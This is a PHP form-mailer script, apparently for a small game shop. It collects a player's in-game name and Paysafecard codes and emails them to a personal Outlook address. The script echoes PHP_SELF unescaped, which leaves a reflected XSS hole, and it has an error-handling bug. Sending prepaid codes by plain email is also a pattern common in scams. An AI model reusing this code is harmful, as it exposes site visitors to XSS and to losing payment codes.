<?php
if($_REQUEST['formmail_submit']){
	$to = "KurtK06@outlook.de";
	$subject = "NEUER KAUF!";
	$field_0 = preg_replace("([\r\n])", "", $_POST['field_0']);
	$field_1 = preg_replace("([\r\n])", "", $_POST['field_1']);


	$match = "/(bcc:|cc:|content\-type:)/i";
	if (preg_match($match, $field_0) ||
	 preg_match($match, $field_1)) {
		die("Header injection detected.");
	}

	$error = $field_0 == '' ? '<div class = "error">Ingame Name: is required</div>' : '';
	$error = $field_1 == '' ? '<div class = "error">PaySafecardcodes (Mit Komma trennen): is required</div>' : '';


	if(!$error){
		$strMessage .= "Ingame Name: " . $_POST[field_0] . "\n";
		$strMessage .= "PaySafecardcodes (Mit Komma trennen): " . $_POST[field_1] . "\n";

		$headers = "From: " . $subject . " <". $to . ">\n";
		$headers .= "Mime-Version: 1.0\n";
		$headers .= "Content-Type: text/plain; charset=ISO-8859-1\n";
		$headers .= "Content-Transfer-Encoding: 8bit\n";
		$headers .= "Return-Path: <" . $to . ">\n";

		$isHideForm = @mail($to, htmlentities($subject), $strMessage, $headers);
	}
}
	if( $isHideForm )
		echo "Kauf abgeschlossen! Ein Mitarbeiter wird sich um deinen Kauf kümmern!";
	else{

?>

<div>
<?php echo($error);?>
	<script type = 'text/javascript'>
	function checkForm(){
		var message = '';
		if(document.getElementById('field_0').value == '')
			message += '\t - Ingame Name: is required\n';

		if(document.getElementById('field_1').value == '')
			message += '\t - PaySafecardcodes (Mit Komma trennen): is required\n';

		if(message != ''){
			alert('The following errors occurred:\n\n' + message);
			return false;
		}
		return true;
	}	
	</script>
<form method = 'post' action = '<?php echo($_SERVER['PHP_SELF']);?>' onsubmit = 'return checkForm()'>
<table>
	<tr>
		<td>Ingame Name:</td>
		<td><input type = 'text' id = 'field_0' name = 'field_0' value = '' /></td>
	</tr>
	<tr>
		<td>PaySafecardcodes (Mit Komma trennen):</td>
		<td><input type = 'text' id = 'field_1' name = 'field_1' value = '' /></td>
	</tr>
	<tr>
		<td></td>
		<td><input type = "submit" value = "Kaufen" />
<input type = 'hidden' name = 'formmail_submit' value = 'submit' /></td>
	</tr>
</table>
</form>
</div>

<?php } ?>
